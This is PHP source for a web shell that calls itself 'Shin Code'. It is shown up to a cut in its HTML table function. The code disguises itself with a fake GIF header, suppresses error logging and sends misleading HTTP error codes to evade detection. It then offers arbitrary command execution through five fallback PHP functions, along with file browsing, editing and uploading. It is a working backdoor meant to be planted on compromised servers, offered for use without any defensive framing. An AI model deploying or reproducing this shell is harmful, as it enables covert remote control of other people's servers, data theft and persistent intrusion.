<?php
echo "<!-- GIF89;a -->\n";
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);
@ob_clean();
@header("X-Accel-Buffering: no");
@header("Content-Encoding: none");
@http_response_code(403);
@http_response_code(404);
@http_response_code(500);
//Shin Code - Created 15 July 2023
//jan di ganti ganti ntar error aoakwkwk
//Recode aja  banh penting ga cuma ganti copyright :')
function getFileDetails($path)
{
    $folders = [];
    $files = [];

    try {
        $items = @scandir($path);
        if (!is_array($items)) {
            throw new Exception('Failed to scan directory');
        }

        foreach ($items as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }

            $itemPath = $path . '/' . $item;
            $itemDetails = [
                'name' => $item,
                'type' => is_dir($itemPath) ? 'Folder' : 'File',
                'size' => is_dir($itemPath) ? '' : formatSize(filesize($itemPath)),
                'permission' => substr(sprintf('%o', fileperms($itemPath)), -4),
            ];
            if (is_dir($itemPath)) {
                $folders[] = $itemDetails;
            } else {
                $files[] = $itemDetails;
            }
        }

        return array_merge($folders, $files);
    } catch (Exception $e) {
        return 'None';
    }
}

function formatSize($size)
{
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($size >= 1024 && $i < 4) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}
//cmd fitur
function executeCommand($command)
{
    $currentDirectory = getCurrentDirectory();
    $command = "cd $currentDirectory && $command";

    $output = '';
    $error = '';

    // proc_open
    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];

    $process = @proc_open($command, $descriptors, $pipes);

    if (is_resource($process)) {
        fclose($pipes[0]);

        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        $error = stream_get_contents($pipes[2]);
        fclose($pipes[2]);

        $returnValue = proc_close($process);

        $output = trim($output);
        $error = trim($error);

        if ($returnValue === 0 && !empty($output)) {
            return $output;
        } elseif (!empty($error)) {
            return 'Error: ' . $error;
        }
    }

    // shell_exec
    $shellOutput = @shell_exec($command);
    if ($shellOutput !== null) {
        $output = trim($shellOutput);
        if (!empty($output)) {
            return $output;
        }
    } else {
        $error = error_get_last();
        if (!empty($error)) {
            return 'Error: ' . $error['message'];
        }
    }

    // exec
    @exec($command, $execOutput, $execStatus);
    if ($execStatus === 0) {
        $output = implode(PHP_EOL, $execOutput);
        if (!empty($output)) {
            return $output;
        }
    } else {
        return 'Error: Command execution failed.';
    }

    // passthru
    ob_start();
    @passthru($command, $passthruStatus);
    $passthruOutput = ob_get_clean();
    if ($passthruStatus === 0) {
        $output = $passthruOutput;
        if (!empty($output)) {
            return $output;
        }
    } else {
        return 'Error: Command execution failed.';
    }

    // system
    ob_start();
    @system($command, $systemStatus);
    $systemOutput = ob_get_clean();
    if ($systemStatus === 0) {
        $output = $systemOutput;
        if (!empty($output)) {
            return $output;
        }
    } else {
        return 'Error: Command execution failed.';
    }

    return 'Error: Command execution failed.';
}
function readFileContent($file)
{
    return file_get_contents($file);
}

function saveFileContent($file)
{
    if (isset($_POST['content'])) {
        return file_put_contents($file, $_POST['content']) !== false;
    }
    return false;
}
//upfile
function uploadFile($targetDirectory)
{
    if (isset($_FILES['file'])) {
        $currentDirectory = getCurrentDirectory();
        $targetFile = $targetDirectory . '/' . basename($_FILES['file']['name']);
        if ($_FILES['file']['size'] === 0) {
            return 'Open Ur Eyes Bitch !!!.';
        } else {
        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
            return 'File uploaded successfully.';
        } else {
            return 'Error uploading file.';
        }
    }
    return '';
}
}
//dir
function changeDirectory($path)
{
    if ($path === '..') {
        @chdir('..');
    } else {
        @chdir($path);
    }
}

function getCurrentDirectory()
{
    return realpath(getcwd());
}

//open file juga folder
function getLink($path, $name)
{
    if (is_dir($path)) {
        return '<a href="?dir=' . urlencode($path) . '">' . $name . '</a>';
    } else {
        return '<a href="?edit=' . urlencode($path) . '">' . $name . '</a>';
    }
}
function getDirectoryArray($path)
{
    $directories = explode('/', $path);
    $directoryArray = [];
    $currentPath = '';
    foreach ($directories as $directory) {
        if (!empty($directory)) {
            $currentPath .= '/' . $directory;
            $directoryArray[] = [
                'path' => $currentPath,
                'name' => $directory,
            ];
        }
    }
    return $directoryArray;
}


function showBreadcrumb($path)
{
    $path = str_replace('\\', '/', $path);
    $paths = explode('/', $path);
    ?>
    <div class="breadcrumb">
        <?php foreach ($paths as $id => $pat) { ?>
            <?php if ($pat == '' && $id == 0) { ?>
             DIR : <a href="?dir=/">/</a>
            <?php } ?>
            <?php if ($pat == '') {
                continue;
            } ?>
            <?php $linkPath = implode('/', array_slice($paths, 0, $id + 1)); ?>
            <a href="?dir=<?php echo urlencode($linkPath); ?>"><?php echo $pat; ?></a>/
        <?php } ?>
    </div>
    <?php
}


//tabel biar keren
function showFileTable($path)
{
    $fileDetails = getFileDetails($path);
    ?>
    <table>
        <tr>
            <th